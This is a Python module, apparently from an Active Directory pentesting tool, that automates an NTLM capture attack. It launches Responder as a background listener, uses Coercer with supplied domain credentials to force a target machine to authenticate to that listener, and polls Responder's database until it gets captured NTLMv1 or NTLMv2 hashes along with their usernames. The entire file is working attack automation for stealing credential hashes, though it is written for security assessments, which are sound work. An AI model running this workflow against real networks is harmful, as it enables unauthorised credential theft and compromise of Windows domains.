"""Reusable NTLM capture workflows for listeners and coercion triggers.

This module provides a small orchestration layer for workflows that need to:

- start a listener in the background (currently Responder)
- trigger outbound authentication (currently Coercer)
- observe a capture source and classify NTLMv1 vs NTLMv2

The goal is to keep the capture logic reusable for future NTLM relay and
coercion techniques without coupling the interactive CLI directly to a
specific external tool implementation.
"""

from __future__ import annotations

from dataclasses import dataclass
import os
import sqlite3
import subprocess
import time
from typing import Any, Callable, Iterable, Protocol

from adscan_internal.background_process import launch_background, stop_background
from adscan_internal.integrations.coercer import CoercerRunner


class SpawnShell(Protocol):
    """Shell surface required to start/stop background listener processes."""

    def spawn_command(
        self,
        command: list[str],
        *,
        env: dict[str, str] | None = None,
        shell: bool = False,
        stdout: Any = None,
        stderr: Any = None,
        preexec_fn: Any = None,
    ) -> Any:
        """Spawn a command in the background."""
        ...


RunCommand = Callable[..., subprocess.CompletedProcess[str] | None]


@dataclass(frozen=True)
class NtlmCaptureObservation:
    """A single NTLM authentication capture observed by the listener."""

    raw_user: str
    clean_user: str
    ntlm_version: str
    fullhash: str


@dataclass(frozen=True)
class NtlmCaptureProbeResult:
    """Result of a single coercion-to-capture workflow run."""

    success: bool
    auth_type: str | None
    observation: NtlmCaptureObservation | None
    reason: str | None
    trigger_command: list[str]
    trigger_returncode: int | None
    trigger_stdout: str
    trigger_stderr: str
    trigger_error_kind: str | None
    trigger_error_detail: str | None
    listener_returncode: int | None
    listener_expected_stop: bool


def _extract_responder_username(raw_user: str) -> tuple[str, str | None]:
    """Split ``DOMAIN\\user`` values returned by Responder."""

    if "\\" in raw_user:
        netbios_domain, username = raw_user.split("\\", 1)
        return username, netbios_domain
    return raw_user, None


def _normalize_expected_usernames(values: Iterable[str]) -> set[str]:
    """Normalize candidate usernames for case-insensitive comparisons."""

    normalized: set[str] = set()
    for value in values:
        candidate = str(value or "").strip()
        if candidate:
            normalized.add(candidate.casefold())
    return normalized


class ResponderListener:
    """Background Responder listener with capture observation helpers."""

    def __init__(
        self,
        *,
        responder_python: str,
        responder_script: str,
        responder_db_path: str,
        interface: str,
        shell: SpawnShell,
        label: str = "Responder",
    ) -> None:
        self.responder_python = responder_python
        self.responder_script = responder_script
        self.responder_db_path = responder_db_path
        self.interface = interface
        self.shell = shell
        self.label = label
        self.process: Any = None
        self.exit_returncode: int | None = None
        self.exit_expected_stop = False

    def _handle_process_exit(self, returncode: int | None, expected_stop: bool) -> None:
        """Persist watcher exit metadata for later diagnostics."""

        self.exit_returncode = returncode
        self.exit_expected_stop = expected_stop

    def clear_database(self) -> None:
        """Delete all prior captures from the Responder SQLite database."""

        if not os.path.exists(self.responder_db_path):
            return

        with sqlite3.connect(self.responder_db_path) as connection:
            cursor = connection.cursor()
            cursor.execute("DELETE FROM Responder")
            connection.commit()

    def start(self) -> bool:
        """Start Responder in the background."""

        env = os.environ.copy()
        command = [
            self.responder_python,
            self.responder_script,
            "-I",
            self.interface,
        ]
        self.process = launch_background(
            command,
            self.shell.spawn_command,
            env=env,
            needs_root=True,
            label=self.label,
            watch=True,
            on_exit=self._handle_process_exit,
        )
        return self.process is not None

    def stop(self) -> None:
        """Stop the background Responder process if it is running."""

        stop_background(self.process, label=self.label)

    def wait_for_capture(
        self,
        *,
        timeout_seconds: int,
        expected_usernames: Iterable[str] | None = None,
        poll_interval_seconds: float = 1.0,
    ) -> NtlmCaptureObservation | None:
        """Wait for the first matching NTLM capture in ``Responder.db``."""

        deadline = time.time() + max(timeout_seconds, 1)
        expected = _normalize_expected_usernames(expected_usernames or [])
        seen_rows: set[tuple[str, str, str]] = set()

        while time.time() < deadline:
            if not os.path.exists(self.responder_db_path):
                time.sleep(poll_interval_seconds)
                continue

            try:
                with sqlite3.connect(self.responder_db_path) as connection:
                    cursor = connection.cursor()
                    cursor.execute(
                        "SELECT user, fullhash, type FROM Responder ORDER BY rowid DESC"
                    )
                    rows = cursor.fetchall()
            except sqlite3.Error:
                time.sleep(poll_interval_seconds)
                continue

            for raw_user, fullhash, hash_type in rows:
                key = (str(raw_user), str(fullhash), str(hash_type))
                if key in seen_rows:
                    continue
                seen_rows.add(key)

                clean_user, _ = _extract_responder_username(str(raw_user))
                if expected and clean_user.casefold() not in expected:
                    continue

                lowered_hash_type = str(hash_type or "").casefold()
                if "v1" in lowered_hash_type:
                    version = "NTLMv1"
                elif "v2" in lowered_hash_type:
                    version = "NTLMv2"
                else:
                    continue

                return NtlmCaptureObservation(
                    raw_user=str(raw_user),
                    clean_user=clean_user,
                    ntlm_version=version,
                    fullhash=str(fullhash),
                )

            time.sleep(poll_interval_seconds)

        return None

def run_ntlm_capture_probe(
    *,
    listener: ResponderListener,
    trigger: CoercerRunner,
    target: str,
    listener_ip: str,
    username: str,
    secret: str,
    domain: str,
    expected_usernames: Iterable[str],
    capture_timeout_seconds: int,
    trigger_timeout_seconds: int,
    auth_type: str = "smb",
    dc_ip: str | None = None,
    method_filter: str | None = None,
    listener_ready_delay_seconds: float = 2.0,
    post_trigger_wait_seconds: float = 2.0,
    sleep_fn: Callable[[float], None] = time.sleep,
) -> NtlmCaptureProbeResult:
    """Run a coercion-to-capture probe and classify the observed NTLM auth type."""

    if not listener.start():
        return NtlmCaptureProbeResult(
            success=False,
            auth_type=None,
            observation=None,
            reason="listener_start_failed",
            trigger_command=[],
            trigger_returncode=None,
            trigger_stdout="",
            trigger_stderr="",
            trigger_error_kind=None,
            trigger_error_detail=None,
            listener_returncode=None,
            listener_expected_stop=False,
        )

    trigger_command: list[str] = []
    trigger_result: subprocess.CompletedProcess[str] | None = None
    trigger_error_kind: str | None = None
    trigger_error_detail: str | None = None
    try:
        listener.clear_database()
        sleep_fn(max(listener_ready_delay_seconds, 0.0))
        if listener.process is not None and hasattr(listener.process, "poll"):
            if listener.process.poll() is not None:
                return NtlmCaptureProbeResult(
                    success=False,
                    auth_type=None,
                    observation=None,
                    reason="listener_exited_early",
                    trigger_command=[],
                    trigger_returncode=None,
                    trigger_stdout="",
                    trigger_stderr="",
                    trigger_error_kind=None,
                    trigger_error_detail=None,
                    listener_returncode=listener.exit_returncode,
                    listener_expected_stop=listener.exit_expected_stop,
                )
        trigger_execution = trigger.run(
            target=target,
            listener_ip=listener_ip,
            username=username,
            secret=secret,
            domain=domain,
            timeout_seconds=trigger_timeout_seconds,
            auth_type=auth_type,
            dc_ip=dc_ip,
            method_filter=method_filter,
        )
        trigger_command = trigger_execution.command
        trigger_result = trigger_execution.result
        trigger_error_kind = trigger_execution.error_kind
        trigger_error_detail = trigger_execution.error_detail
        sleep_fn(max(post_trigger_wait_seconds, 0.0))
        observation = listener.wait_for_capture(
            timeout_seconds=capture_timeout_seconds,
            expected_usernames=expected_usernames,
        )
    finally:
        listener.stop()

    if observation is not None:
        return NtlmCaptureProbeResult(
            success=True,
            auth_type=observation.ntlm_version,
            observation=observation,
            reason=None,
            trigger_command=trigger_command,
            trigger_returncode=(
                trigger_result.returncode if trigger_result is not None else None
            ),
            trigger_stdout=(trigger_result.stdout or "") if trigger_result else "",
            trigger_stderr=(trigger_result.stderr or "") if trigger_result else "",
            trigger_error_kind=trigger_error_kind,
            trigger_error_detail=trigger_error_detail,
            listener_returncode=listener.exit_returncode,
            listener_expected_stop=listener.exit_expected_stop,
        )

    reason = "capture_not_observed"
    if listener.exit_returncode is not None and not listener.exit_expected_stop:
        reason = "listener_exited_during_capture"

    return NtlmCaptureProbeResult(
        success=False,
        auth_type=None,
        observation=None,
        reason=reason,
        trigger_command=trigger_command,
        trigger_returncode=(
            trigger_result.returncode if trigger_result is not None else None
        ),
        trigger_stdout=(trigger_result.stdout or "") if trigger_result else "",
        trigger_stderr=(trigger_result.stderr or "") if trigger_result else "",
        trigger_error_kind=trigger_error_kind,
        trigger_error_detail=trigger_error_detail,
        listener_returncode=listener.exit_returncode,
        listener_expected_stop=listener.exit_expected_stop,
    )
